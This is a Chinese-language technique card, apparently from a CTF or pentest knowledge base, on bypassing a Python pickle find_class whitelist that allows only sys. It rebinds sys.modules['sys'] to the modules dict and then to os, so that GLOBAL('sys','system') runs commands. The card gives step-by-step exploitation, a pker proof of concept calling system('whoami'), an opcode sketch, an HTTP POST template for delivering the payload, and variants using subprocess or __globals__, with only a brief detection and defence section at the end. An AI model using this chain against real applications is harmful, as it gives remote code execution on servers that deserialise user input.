---
id: web-python-deserialization-pickle-sys-modules-self-rebind
title: pickle 白名单只放行 sys 时的绕过：把 sys.modules['sys'] 重绑为 modules 再重绑为 os，GLOBAL('sys','system') 即执行命令
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-sys-modules-self-rebind-whitelist-bypass
aliases:
- sys.modules 自包含绕过
- pickle sys 白名单绕过
- sys.modules['sys']=os
- 只允许 sys 模块 find_class 绕过
- pker sys modules
tags:
- python
- pickle
- deserialization
- restricted-unpickler
- sys-modules
- whitelist-bypass
- setitem
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W3
  verified_at: '2026-11-08T12:40:14+08:00'
  notes: 已对照原文核对；find_class(sys白名单+禁点号)与 pker 序列 modules['sys']=modules -> get('os') -> modules['sys']=os -> GLOBAL('sys','system') 与原文一致；手写 opcode 片段仅为示意，未执行任何载荷
---

## 一句话结论

当 `RestrictedUnpickler.find_class` 只放行 `sys` 模块、且禁止属性名里出现 `.`（意图是"只能一级模块"）时，可以用 SETITEM opcode 直接改写运行时字典：先 `sys.modules['sys'] = sys.modules` 让"名字 sys"解析到 modules 字典本身，再 `sys.modules['sys'] = sys.modules.get('os')` 把它换成 os 模块；此后 `GLOBAL('sys','system')` 经 `find_class('sys','system')` 允许列表通过、`getattr(sys, 'system')` 拿到的其实是 `os.system`，传入命令即 RCE——全程没有 import 子模块、属性名里也没有 `.`。

## 原理

- **find_class 的校验对象是"模块名 + 属性名"字符串**：`if module not in whitelist or '.' in name: raise` 只检查字符串，不检查名字最终解析到什么对象。`sys` 在白名单里，`'system'` 不含 `.`，所以 `GLOBAL('sys','system')` 能过校验。
- **`sys.modules` 是运行时模块注册表**：它是一个 dict，Python 的 `import`/`__import__` 最终都查这张表；把 `sys.modules['sys']` 改成别的对象，等于让"名为 sys 的模块"变成任意对象。表里本来就有 `sys` 自身（`sys.modules['sys'] is sys`），这是"自包含"的关键。
- **两级跳转**：
  1. `sys.modules['sys'] = sys.modules`：现在 `import sys` 得到的是 modules 字典，于是 `sys` 这个名字可访问到全部模块（`sys['os']`、`sys.get('os')` 等），相当于把"一级模块"变成"模块总表"。
  2. `sys.modules['sys'] = sys.modules.get('os')`（或 `modules_get('os')`）：现在"名为 sys 的模块"就是 os 模块，`find_class('sys','system')` 里的 `getattr(sys_module, 'system')` 实际取到 `os.system`。
- **为什么用 SETITEM（`b's'`）而不是调用函数**：SETITEM 直接对栈顶对象做 `obj[key] = value`，不经过 `find_class` 的任何额外校验，也不需要 `REDUCE`；在"只允许 sys 且 restriction 只看类名字符串"的模型下，这是最短的一条写字典原语。
- **落地执行的完整序列**：`GLOBAL('sys','modules')` → `modules['sys']=modules` → `GLOBAL('sys','get')` → `modules_get('os')` → `modules['sys']=os` → `GLOBAL('sys','system')` → `system('whoami')`。注意第二次 `GLOBAL('sys','get')` 也过白名单（`'get'` 不含点），取到的是 modules 字典的 `get`。
- **边界**：改 `sys.modules` 会影响整个进程（后续 import 行为被污染），属于"运行时状态篡改"；除 RCE 外还可用它把某个模块替换成攻击者构造的对象，让后续业务代码在新语义下运行。

## 触发条件

- 应用对用户可控数据调用 `pickle.loads`/`Unpickler.load`，且未做真正的安全白名单；
- `find_class` 只校验"模块名是否在白名单 + 属性名是否含 `.`"，白名单里含 `sys`（或任何其 `modules` 可达的模块）；
- pickle 协议允许 SETITEM（protocol 0/1 用 `s`，protocol 2+ 用 `BINPUT`/`SETITEMS` 等，等价能力存在）；
- 进程能执行外部命令（非受限沙箱），或至少能读文件/访问网络。

## 利用步骤

1. 读 `find_class` 源码，确认它是"字符串级"校验：白名单模块 + 禁用点号。
2. 用 pker（或手写 opcode）构造：先取 `sys.modules`，用 SETITEM 把 `'sys'` 映射为 modules 自身；再取 modules 的 `get`，通过它拿到 `os`；再 SETITEM 把 `'sys'` 映射为 os。
3. 用 `GLOBAL('sys','system')` 取出（此时实际是 `os.system`），`REDUCE` 调用并传入命令。
4. 提交 payload 观察回显/副作用；由于改了 `sys.modules`，测试环境建议重启进程后再复测。
5. 若 `system` 也被禁，可换成同一条路走 `sys.modules.get('subprocess')`，再取 `Popen`/`check_output` 等（属性名同样不含点）。

## PoC

pker 代码（原文）：

```python
modules = GLOBAL('sys', 'modules')
modules['sys'] = modules            # SETITEM：让名为 sys 的模块变成 modules 字典
modules_get = GLOBAL('sys', 'get') # 此时取到 modules 字典的 get
os = modules_get('os')
modules['sys'] = os                 # SETITEM：让名为 sys 的模块变成 os
system = GLOBAL('sys', 'system')   # 实际取到 os.system
system('whoami')                    # REDUCE 调用
return
```

等价手写 opcode 的关键片段（protocol 0 语义，示意）：

```text
csys\nmodules\n     # GLOBAL sys.modules
( push 字典
s' sys' 值           # SETITEM：modules['sys'] = modules
...
```

```http
POST /ppicklee HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

data=<base64(上面的 pickle 字节流)>
```

## 变体与关联

- 变体：把 `sys` 换成白名单里任意模块（如 `json`、`logging`），只要该模块对象能通过属性拿到 `sys.modules`（常见 `json.loads.__globals__` 之类），同一套 SETITEM 递进即可。
- 变体：不用 `os`，改成 `modules['sys'] = modules.get('posix')` 或 `get('subprocess')`，再取 `system`/`Popen`。
- 变体：目标只允许 `builtins` 且黑名单排除若干名字时，可用 `builtins.globals()` 取到模块全局字典、`dict.get`/`getattr` 递进取回被禁对象（与关联卡的 getattr 路线互补）。
- 关联：[[web-python-deserialization-restricted-unpickler-getattr-bypass]]（同为 `find_class` 白名单绕过，但那条依赖放行 `builtins.getattr` 动态取属性；本卡不需要 getattr，只依赖 `sys.modules` 可写与 SETITEM）。
- 关联：[[web-python-deserialization-unpickler-persistent-load-system]]（BUILD 篡改 `persistent_load` 的另一种"改运行时状态"原语）。
- 边界：`sys.modules` 被替换后进程内 import 语义被污染，可能影响后续请求（可观测但要谨慎）；若目标在 `find_class` 之外还对反序列化结果做二次校验（如只接受特定类实例），需先确认。

## 检测与防御

- 检测：pickle 字节流中出现 `sys` + `modules` + `s`（SETITEM）组合，或反序列化后 `sys.modules['sys']` 与真实 `sys` 不等；监控进程内 `sys.modules` 的运行时变更。
- 防御：不要用"白名单模块名 + 禁点号"这种字符串级校验；改用 `find_class` 严格列举允许的 `(module, name)` 组合，或直接禁用 pickle、改 JSON；反序列化放独立低权进程；部署运行时可观测（如 audit hook）记录 `sys.modules` 异常写入。
